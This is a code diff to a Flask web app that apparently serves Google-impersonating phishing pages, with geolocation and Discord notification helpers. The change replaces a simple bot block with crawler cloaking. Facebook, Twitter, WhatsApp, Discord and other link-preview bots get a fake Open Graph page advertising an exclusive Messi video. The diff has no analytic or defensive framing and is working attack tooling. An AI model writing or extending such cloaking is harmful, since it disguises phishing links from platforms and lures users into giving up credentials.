@@ -62,9 +62,11 @@ def get_geo(ip):
         pass
     return "Unknown"
 
-def is_bot(ua):
-    bots = ['bot', 'crawler', 'spider', 'facebook', 'google', 'bing']
-    return any(b in ua.lower() for b in bots)
+def is_social_crawler(ua):
+    """Detecta si es un crawler de redes sociales que debe ver el contenido público"""
+    social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
+                   'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
+    return any(bot in ua.lower() for bot in social_bots)
 
 def send_notifications(data):
     # Discord
@@ -223,10 +225,30 @@ def get_template(name='google'):
     return templates.get(name, templates['google'])
 
 @app.before_request
-def check_bot():
+def handle_bots():
     ua = request.headers.get('User-Agent', '')
-    if is_bot(ua) and request.path == '/':
-        abort(403)
+    
+    # Si es un crawler social y está en la raíz, mostrar contenido Open Graph
+    if is_social_crawler(ua) and request.path == '/':
+        return render_template_string('''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="😲 Fuertes declaraciones de Messi">
+    <meta property="og:description" content="Video exclusivo: Messi habla sobre su futuro en el fútbol">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
+    <meta property="og:url" content="https://video-xeen.onrender.com/">
+    <meta property="og:type" content="video.other">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>Video de Messi</title>
+</head>
+<body>
+    <h1>Video exclusivo de Messi</h1>
+    <p>Contenido disponible solo para usuarios registrados</p>
+</body>
+</html>
+'''), 200
 
 @app.route('/')
 def index():
